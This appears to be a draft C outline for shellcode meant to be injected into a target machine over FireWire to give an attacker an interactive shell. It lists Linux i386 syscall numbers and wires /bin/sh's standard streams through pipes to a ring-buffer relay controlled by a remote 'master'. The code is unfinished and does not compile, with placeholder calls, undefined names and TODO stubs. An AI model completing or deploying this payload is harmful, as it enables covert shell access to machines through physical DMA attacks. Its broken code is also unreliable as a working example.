
// simple outline of a to-be-injected shellcode that gives
// an interactive shell over firewire
//

#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>

/*
 * http://www.lxhp.in-berlin.de/lhpsyscal.html
 *
 * all necessary system calls:
 * ===========================
 *
 * clone:	eax: 120
 * 		ebx: clone-flags
 * 		ecx: ptr to top of (distinct) stack space
 * 		edx: ptr to pt_regs or NULL
 *
 * close:	eax: 6
 * 		ebx: fd to close
 *
 * dup2:	eax: 63
 * 		ebx: fd 2 dup
 * 		ecx: fd to assign the dup to
 *
 * execve:	eax: 11
 * 		ebx: ptr to string of program path&name
 * 		ecx: ptr to argv[]
 * 		edx: ptr to envv[]
 *
 * exit:	eax: 1
 * 		ebx: exit code
 *
 * fcntl:	eax: 55
 * 		ebx: fd
 * 		ecx: command code
 * 		edx: file locks: ptr to writable struct flock
 *
 * fork:	eax: 2
 * 		ebx... are passed to forked process.
 *
 * kill:	eax: 37
 * 		ebx: pid (?)
 * 		ecx: signal (?)
 * 		SIGKILL = 9
 *
 * nanosleep:	eax: 162
 * 		ebx: ptr to struct timespec
 * 		ecx: ptr to alterable struct timespec
 *
 * read:	eax: 3
 * 		ebx: fd
 * 		ecx: ptr to buffer
 * 		edx: count
 *
 * write:	eax: 4
 * 		ebx: fd
 * 		ecx: ptr to buffer
 * 		edx: count
 *
 * pipe:	eax: 42
 * 		ebx: ptr to dword[2]
 *
 */


struct ringbuffer {
	volatile uint8_t	writer_pos;		// init to 0
	volatile uint8_t	reader_pos;		// init to 0
	char			buffer[256];
};

int main()
{
	// pipes:
	int m2sh[2];	// middleman->shell	0: shell reads
	int sh2m[2];	// shell->middleman	0: middleman reads

	int		child_is_dead = 0;
	volatile int	child_is_dead_ACK = 0;

	// flags inidacing, wheather the pipes to/from the child are ok
	int		to_child_ok = 1;
	int		from_child_ok = 1;

	// ringbuffer for communication with master
	struct ringbuffer from_master;
	struct ringbuffer to_master;

	// non-volatile copy of ringbuffer position
	int rb_position;

	if(0 > pipe(m2sh))
		goto child_dead;
	if(0 > pipe(sh2m))
		goto child_dead;

	switch(fork()) {
		case 0:
			// child: change stdin, stdout and stderr and exec /bin/sh
			if(0 != dup2(m2sh[0], 0))
				exit(0);
			if(1 != dup2(sh2m[1], 1))
				exit(0);
			if(2 != dup2(sh2m[1], 2))
				exit(0);

			execl("/bin/sh", "/bin/sh", NULL);
			exit(0);

		default:
			// parent: use a ringbuffer for stdin and stdout of child
			close(m2sh[0]);
			close(sh2m[1]);

			clone(...);
			if(original) {
				reader-thread();
			} else {
				// clone
				writer-thread();
			}

			
			// TODO:
			// loop with read/write relayed via ringbuffer and nanosleep
			// 	(signal-handler -> ret and O_ASYNC for nanosleep?)
			// when both FD are closed:
			while(to_child_ok || from_child_ok) {
				// cache the volatile value...
				rb_position = from_master.writer_pos;
				if(to_child_ok) {
					// unless buffer is empty
					if(rb_position != from_master.reader_pos) {
						// do write...
					}
				}

				rb_position = to_master.reader_pos;
				if(from_child_ok) {
					// unless buffer is full
					if( !(to_master.writer_pos == rb_position) ) {
						// do read...
						// read() may return -EAGAIN
					}
				}
			}
			/* fall through: */
		case -1:
			goto child_dead;
	}

child_dead:
	// wait at most 3 seconds for master to realize this.
	while(child_is_dead <= 2 && child_is_dead_ACK == 0) {
		child_is_dead++;
		sleep(1);
	}

	exit(0);
}

